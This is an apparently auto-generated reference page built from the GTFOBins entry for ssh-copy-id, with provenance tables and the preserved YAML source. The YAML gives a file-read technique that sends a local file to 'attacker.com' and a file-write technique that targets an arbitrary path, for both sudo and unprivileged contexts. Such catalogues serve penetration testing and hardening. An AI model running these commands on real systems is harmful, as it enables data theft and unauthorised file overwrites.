---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ssh-copy-id

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ssh-copy-id` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ssh-copy-id](../../tools/linux/ssh-copy-id.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ssh-copy-id |
| name | ssh-copy-id |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ssh-copy-id/ |

## Preserved Source Material

```yaml
_body: ''
_name: ssh-copy-id
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh-copy-id
functions:
  file-read:
  - code: ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
    comment: The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise
      the `-t /path/to/output-file` option can be used.
    contexts:
      sudo: null
      unprivileged: null
  file-write:
  - code: ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
    comment: The input file must have the `.pub` file extension.
    contexts:
      sudo: null
      unprivileged: null
```
